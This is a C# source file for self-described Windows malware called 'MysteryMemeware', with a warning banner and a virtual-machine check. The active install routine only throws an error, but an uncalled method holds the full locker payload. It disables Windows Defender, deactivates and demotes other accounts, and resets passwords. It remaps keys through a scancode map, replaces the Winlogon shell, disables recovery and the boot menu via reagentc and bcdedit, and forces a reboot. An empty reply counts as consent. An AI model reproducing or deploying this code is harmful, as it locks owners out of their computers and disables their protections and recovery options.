namespace MysteryMemeware
{
    public static class Program
    {
        public static void Main()
        {
            System.Console.ForegroundColor = System.ConsoleColor.White;
            System.Console.WriteLine("MysteryMemeware - " + typeof(Program).Assembly.GetName().Version.ToString());
            System.Console.WriteLine("Will you ever be able to use your pc again? It's a mystery!");
            System.Console.WriteLine();
            System.Console.ForegroundColor = System.ConsoleColor.Red;
            System.Console.WriteLine("WARNING: This software is malware and was created for educational and research purposes only.");
            System.Console.WriteLine("Installing this software on computers that do not belong to you is a felony in violation of the computer fraud and absue act and can result in fines or even jail time!");
            System.Console.WriteLine("Use of this software will perminantly damage to your system and may result in loss of data or even inability your system as intended ever again.");
            System.Console.WriteLine("Only run this software within the confines of a virtual machine. Delete any and all virtual machine files after execution of this software to avoid unintended side effects.");
            System.Console.WriteLine();
            System.Console.ForegroundColor = System.ConsoleColor.White;
            System.Console.WriteLine("To confirm you would like to install MysteryMemeware on this system type \"Confirm Install\". To cancel type \"Cancel\".");
            System.Console.WriteLine("By confirming installation you agreed that you have read the above warnings and take full legal responsibility for any damages that my occur as a result of executing this software.");
            System.Console.WriteLine();
            string userChoice = System.Console.ReadLine();
            System.Console.WriteLine();
            if (userChoice is "Confirm Install" || userChoice is "")
            {
                if (WithinVirtualMachine())
                {
                    Install();
                }
                else
                {
                    System.Console.ForegroundColor = System.ConsoleColor.Yellow;
                    System.Console.WriteLine("The current system does not appear to be a virtual machine.");
                    System.Console.WriteLine("It is highly recommended that you ONLY execute this software within the confines of a virtual machine.");
                    System.Console.WriteLine("If you are completely sure you would like to install this software without the protection of a virtual machine you may type \"Install Outside Virtual Machine\" otherwise type \"Cancel\".");
                    System.Console.WriteLine();
                    System.Console.ForegroundColor = System.ConsoleColor.White;
                    string userChoice2 = System.Console.ReadLine();
                    System.Console.WriteLine();
                    if (userChoice2 is "Install Outside Virtual Machine" || userChoice2 is "")
                    {
                        Install();
                    }
                    else
                    {
                        PrintCancelMessage();
                    }
                }
            }
            else
            {
                PrintCancelMessage();
            }
            System.Console.ForegroundColor = System.ConsoleColor.White;
            System.Console.WriteLine();
            System.Console.WriteLine("Process has exited.");
            System.Console.WriteLine("Press any key to close this window...");
            System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();
            stopwatch.Restart();
            while (stopwatch.ElapsedTicks < 10000000)
            {
                System.Console.ReadKey(true);
            }
            System.Environment.Exit(0);
            System.Threading.Thread.Sleep(-1);
        }
        public static bool WithinVirtualMachine()
        {
            try
            {
                System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem");
                System.Management.ManagementObjectCollection items = searcher.Get();
                foreach (System.Management.ManagementBaseObject item in items)
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string model = item["Model"].ToString().ToLower();
                    if ((manufacturer == "microsoft corporation" && model.Contains("virtual")) || manufacturer.Contains("vmware") || model.Contains("virtualbox"))
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static void PrintCancelMessage()
        {
            System.Console.ForegroundColor = System.ConsoleColor.White;
            System.Console.WriteLine("Installation will not proceed until propper confirmation is given.");
            System.Console.WriteLine("No changes have been made to your system. You may safely close this window and delete this software if desired.");
        }
        public static void Install()
        {
            System.Console.ForegroundColor = System.ConsoleColor.White;
            System.Console.WriteLine("Installing MysteryMemeware...");
            try
            {
                throw new System.Exception("It broke okay.");
            }
            catch (System.Exception exception)
            {
                System.Console.WriteLine();
                System.Console.ForegroundColor = System.ConsoleColor.DarkYellow;
                System.Console.WriteLine("ERROR: " + exception.Message);
            }
        }
        private static void InstallSubMethod()
        {
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring", 1, RegistryType.DWORD);
            if (File.Exists(InstallLocation))
            {
                File.Delete(InstallLocation);
            }
            File.Copy(CurrentExePath, InstallLocation);
            foreach (string username in UserHelper.GetLocalUsernames())
            {
                try
                {
                    if (!StringMatchesCaseless(username, UserHelper.CurrentUsername))
                    {
                        UserHelper.DeactivateUser(username);
                    }
                }
                catch
                {
                }
                try
                {
                    UserHelper.RemoveAdmin(username);
                }
                catch
                {
                }
            }
            UserHelper.ActivateUser("Administrator");
            string newUserPassword = UserHelper.GeneratePassword();
            RegistryHelper.CreateAndSetValue(UserPasswordRegistryPath, newUserPassword, RegistryType.SZ);
            UserHelper.ChangeUserPassword(UserHelper.CurrentUsername, newUserPassword);
            string newAdminPassword = UserHelper.GeneratePassword();
            RegistryHelper.CreateAndSetValue(AdminPasswordRegistryPath, newAdminPassword, RegistryType.SZ);
            UserHelper.ChangeUserPassword("Administrator", newAdminPassword);
            byte[] scancodeMap = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue(IsInstalledRegistryPath, "true", RegistryType.SZ);
            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true);
            RunCommand(System32Folder + "\\shutdown.exe", "/r /f /t 0", false);
        }
    }
}